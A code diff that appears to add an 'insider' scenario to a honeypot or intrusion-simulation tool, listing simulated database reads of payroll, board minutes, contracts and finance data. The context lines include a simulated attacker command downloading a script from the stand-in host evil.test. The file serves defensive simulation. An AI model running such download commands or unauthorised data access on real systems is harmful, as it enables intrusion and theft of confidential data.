@@ -43,6 +43,13 @@ SCENARIOS = {
         (20, "database", "db_read", {"resource": "timesheets"}, "Opens their own timesheet"),
         (50, "database", "db_read", {"resource": "reports"}, "Reads a shared report"),
     ],
+    # A real employee who asks for data outside their own access.
+    "insider": [
+        (0, "database", "db_read", {"resource": "payroll"}, "Asks to open everyone's salaries"),
+        (10, "database", "db_read", {"resource": "board-minutes"}, "Opens confidential board minutes"),
+        (22, "database", "db_read", {"resource": "contracts"}, "Browses customer contracts"),
+        (35, "database", "db_read", {"resource": "finance"}, "Looks at the finance budget"),
+    ],
     "skilled": [
         (0, "cowrie", "command", {"command": "whoami", "resource": "/bin/whoami"}, "Logs into the fake server and runs whoami"),
         (4, "cowrie", "command", {"command": "wget http://evil.test/p.sh", "resource": "/tmp/p.sh"}, "Downloads a tool onto the machine"),
